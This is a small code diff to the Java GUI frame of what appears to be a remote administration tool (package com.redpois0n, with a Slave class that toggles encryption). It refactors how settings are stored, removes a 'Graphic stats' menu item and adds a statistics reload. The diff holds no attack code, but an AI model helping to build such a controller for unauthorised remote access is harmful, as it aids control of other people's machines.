@@ -49,6 +49,7 @@ import com.redpois0n.Main;
 import com.redpois0n.SampleMode;
 import com.redpois0n.Settings;
 import com.redpois0n.Slave;
+import com.redpois0n.Statistics;
 import com.redpois0n.common.Version;
 import com.redpois0n.events.Event;
 import com.redpois0n.events.Events;
@@ -132,7 +133,7 @@ public class Frame extends BaseFrame {
 		rdbtnmntmEnable.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				Slave.toggleEncryption(true);
-				Settings.setVal("encryption", true);
+				Settings.getGlobal().setVal("encryption", true);
 			}
 		});
 		rdbtnmntmEnable.setSelected(true);
@@ -143,7 +144,7 @@ public class Frame extends BaseFrame {
 		rdbtnmntmDisable.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
 				Slave.toggleEncryption(false);
-				Settings.setVal("encryption", false);
+				Settings.getGlobal().setVal("encryption", false);
 			}
 		});
 		encryptionButtonGroup.add(rdbtnmntmDisable);
@@ -665,16 +666,6 @@ public class Frame extends BaseFrame {
 		});
 		mntmWhatsNewIn.setIcon(new ImageIcon(Frame.class.getResource("/icons/question.png")));
 		mnAbout.add(mntmWhatsNewIn);
-
-		JMenuItem mntmStats = new JMenuItem("Graphic stats");
-		mntmStats.setIcon(new ImageIcon(Frame.class.getResource("/icons/resource-monitor-protector.png")));
-		mntmStats.addActionListener(new ActionListener() {
-			public void actionPerformed(ActionEvent arg0) {
-				FrameStats frame = new FrameStats();
-				frame.setVisible(true);
-			}
-		});
-		mnAbout.add(mntmStats);
 
 		JMenuItem mntmDonate = new JMenuItem("Donate");
 		mntmDonate.addActionListener(new ActionListener() {
@@ -1597,6 +1588,8 @@ public class Frame extends BaseFrame {
 		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING).addComponent(toolBar, Alignment.LEADING, GroupLayout.DEFAULT_SIZE, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE).addComponent(tabbedPane, Alignment.LEADING, GroupLayout.DEFAULT_SIZE, 631, Short.MAX_VALUE)).addGap(0)));
 		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addComponent(toolBar, GroupLayout.PREFERRED_SIZE, 20, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addComponent(tabbedPane, GroupLayout.DEFAULT_SIZE, 325, Short.MAX_VALUE).addGap(0)));
 		contentPane.setLayout(gl_contentPane);
+		
+		Statistics.getGlobal().reload();
 	}
 
 	private static void addPopup(Component component, final JPopupMenu popup) {
